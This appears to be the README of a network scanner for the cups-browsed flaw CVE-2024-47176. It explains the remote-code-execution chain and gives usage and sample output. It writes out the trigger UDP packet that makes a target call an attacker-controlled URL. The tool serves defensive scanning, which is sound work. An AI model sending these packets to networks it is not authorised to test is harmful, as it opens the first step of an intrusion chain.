# Quick Start
Example usage: `python3 cups_scanner.py --targets 10.0.0.0/24 --callback 10.0.0.1:1337`

# CVE-2024-47176 Vulnerability Scanner (cups-browsed)

## What is CUPS And Why Does It Matter?
CUPS (Common Unix Printing System) is an open-source framework for managing and controlling printers on UNIX and UNIX-like systems.
It is one of the most used widely-used libraries for printing and is supported by UNIX, Linux, and some Apple devices.
 
Several critical vulnerabilities were found in CUPS, which when chained together, can lead to remote code execution.
The CVEs in question are CVE-2024-47176, CVE-2024-47076, CVE-2024-47175, CVE-2024-47177.

The vulnerabilities allow a remote attacker to add or re-configure network printers in such a way that they will execute arbitrary code when users try to print from them.

# Scanning for Vulnerable CUPS Systems
## A Quick Overview of CVE-2024-47176
The first vulnerability in the chain, CVE-2024-47176, is a flaw in the cups-browsed daemon.

The vulnerability arises from the fact that cups-browsed binds its control port (UDP port 631) to INADDR_ANY, exposing it to the world.
Since requests are not authenticated, anyone capable of reaching the control port can instruct cups-browsed to perform printer discovered.

In cases when the port is not reachable from the internet (due to firewalls or NAT), it may still be reachable via the local network, enabling privilege escalation and lateral movement.
For this reason, I've created this scanner designed to scan your local network for vulnerable cups-browsed instances.

## How CVE-2024-47176 Scanning Works
Typically, an attacker would begin the exploitation process by sending a specially crafted request to cups-browsed on UDP port 631, causing it to reach out to a malicious URL under their control.

For example, a UDP packet containing the following: `0 3 http://<attacker_server>/printers/malicious_printer` would trigger cups-browsed to issue a HTTP request to `http://<attacker_server>/printers/malicious_printer`.

If the URL were to present as a malicious printer, it could chain the rest of the CVEs in order to gain remote code execution.

Using this mechanism, we can trigger a vulnerable cups-browsed instance to issue a HTTP request (callback) to our own server, identifying itself as vulnerable.

The scanning process is as follows:
1. Set up a basic HTTP server (no need to identify as a printer, since we will not be exploiting the RCE vulnerability).
2. Craft a UDP packet which will instruct cups-browsed to connect to our HTTP server.
3. Send the UDP packet to every IP in a give range on port 631.
4. Log any POST requests to the `/printers/` endpoint, which are triggered by vulnerable cups-browsed instances.

Assuming our HTTP server is hosted on `10.0.0.1:1337`, our UDP packet should look like this: `0 3 http://10.0.0.1:1337/printers/test1234`

# Automating Scans with cups_scanner.py
This python scanner handles everything for you (both the HTTP server and scanning).

The script launches a temporary HTTP server via http.server on a specified ip and port, then constructs and sends UDP packets to the every IP in the specified range.
The HTTP server will automatically capture callbacks from vulnerable cups-browsed instances and log them to disk.
 
User friendly logs are written `logs/cups.log` and raw HTTP requests are written to `logs/requests.log`

## command line arguments
`--target` 
the CIDR(s) to scan. Can be a single CIDR or multiple CIDRs separated by commas.  
`--callback` the local ip and port to host our HTTP server on (must be reachable via the target range)  
`--scan-unsafe` by default we only scan assignable host addresses (we exclude the network address and broadcast address)
in some cases it may be desirable to scan these addresses, so this behavior can be overridden with the --scan-unsafe flag.

## Example Usage
**Scanning CIDR `10.0.0.0/24` from ip address `10.0.0.1`, hosting the callback server on `1337`:**  
`python3 cups_scanner.py --targets 10.0.0.0/24 --callback 10.0.0.1:1337`

**Scanning multiple CIDRs from ip address `10.0.0.1`, hosting the callback server on `1337`:**  
`python3 cups_scanner.py --targets 10.0.0.0/24,10.0.1.0/24 --callback 10.0.0.1:1337`

note: the callback server IP must belong to the scanning host, and the port must be reachable from every target IPs.

## Example Output
```bash
<root@haxx> python3 cups_scanner.py --targets 10.0.0.0/24 --callback 10.0.0.0.1:1337
[2024-10-06 21:57:09] starting callback server on 10.0.0.1:1337
[2024-10-06 21:57:14] callback server running on port 10.0.0.1:1337...
[2024-10-06 21:57:14] starting scan
[2024-10-06 21:57:14] scanning range: 10.0.0.1 - 10.0.0.254
[2024-10-06 21:57:14] scan done, use CTRL + C to callback stop server
[2024-10-06 21:57:14] received callback from vulnerable device: 10.0.0.22 - CUPS/2.4.10 (Linux 5.10.0-kali7-amd64; x86_64) IPP/2.0
[2024-10-06 21:57:14] received callback from vulnerable device: 10.0.0.25 - CUPS/2.4.10 (Linux 5.10.0-kali7-amd64; x86_64) IPP/2.0
[2024-10-06 21:57:17] shutting down server and exiting...
```

for more info see: [Official CUPS Vulnerability Write Up](https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/)